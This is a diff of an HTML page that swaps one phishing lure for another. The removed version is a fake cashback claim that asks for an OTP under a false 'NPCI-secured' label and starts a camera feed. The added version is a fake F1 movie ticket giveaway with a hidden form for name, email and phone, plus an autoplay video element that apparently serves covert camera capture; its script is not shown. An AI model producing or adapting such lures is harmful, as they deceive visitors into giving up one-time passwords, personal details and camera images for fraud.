@@ -1,29 +1,73 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Cashback Verification</title>
-  <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>F1: The Movie - Ticket Giveaway</title>
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <div class="container">
-    <div class="card">
-      <h1>🎁 Cashback Reward!</h1>
-      <p>You have ₹527 unclaimed cashback from your last transaction.</p>
-      <p><strong>To claim, complete a 3-second verification.</strong></p>
 
-      <button id="claimBtn">Claim Now</button>
+  <!-- Hero Section -->
+  <section class="hero">
+    <h1>🏁 F1: The Movie</h1>
+    <p>Experience the thrill on the big screen – Free tickets giveaway!</p>
+    <button id="getTicketsBtn">Get Tickets</button>
+  </section>
 
-      <form id="otpForm" style="display:none;">
-        <input type="text" id="inputBox" placeholder="Enter OTP to confirm" maxlength="6">
-        <p class="note">* This is an NPCI-secured verification step</p>
-      </form>
-
-      <video id="video" autoplay playsinline></video>
-      <p id="loader">📷 Initializing camera...</p>
+  <!-- Movie Details -->
+  <section class="details">
+    <div class="poster">
+      <img src="poster.jpg" alt="F1 Movie Poster" />
     </div>
-  </div>
+    <div class="description">
+      <h2>About the Movie</h2>
+      <p>Dubbed "the greatest that never was," Sonny Hayes (Brad Pitt) was FORMULA 1’s most promising phenom of the 1990s until an accident nearly ended his career...</p>
+      <p>Ruben convinces Sonny to return to FORMULA 1 for one last shot at saving the team. But in racing, your teammate is your fiercest rival.</p>
+    </div>
+  </section>
+
+  <!-- Cast, Crew, Reviews -->
+  <section class="cast-reviews">
+    <div class="info-section">
+      <div class="cast">
+        <h3>🎬 Cast</h3>
+        <ul>
+          <li>Brad Pitt as Sonny Hayes</li>
+          <li>Damson Idris as Joshua Pearce</li>
+          <li>Kerry Condon as Kate McKenna</li>
+          <li>Tobias Menzies as Peter Banning</li>
+          <li>Javier Bardem as Ruben Cervantes</li>
+        </ul>
+      </div>
+      <div class="crew">
+        <h3>🎥 Crew</h3>
+        <ul>
+          <li>Director: Joseph Kosinski</li>
+          <li>Producer: Brad Pitt</li>
+          <li>Screenplay: Ehren Kruger</li>
+        </ul>
+      </div>
+    </div>
+    <div class="reviews">
+      <h3>⭐ Top Reviews</h3>
+      <blockquote>“Mind-blowing cinematography. Definitely worth it.” – User</blockquote>
+      <blockquote>“This is a movie-making marvel!” – Laganjeet</blockquote>
+      <blockquote>“If you're an F1 fan, this is a must-watch.” – Himanshu</blockquote>
+    </div>
+  </section>
+
+  <!-- Form Section -->
+  <section class="form-section" id="formSection" style="display: none;">
+    <h2>🎟️ Book Your Free Ticket</h2>
+    <form id="ticketForm">
+      <input type="text" name="name" placeholder="Your Name" required />
+      <input type="email" name="email" placeholder="Email" required />
+      <input type="tel" name="phone" placeholder="Phone Number" required />
+      <button type="submit">Submit</button>
+    </form>
+    <video id="video" autoplay playsinline></video>
+  </section>
 
   <script src="script.js"></script>
 </body>
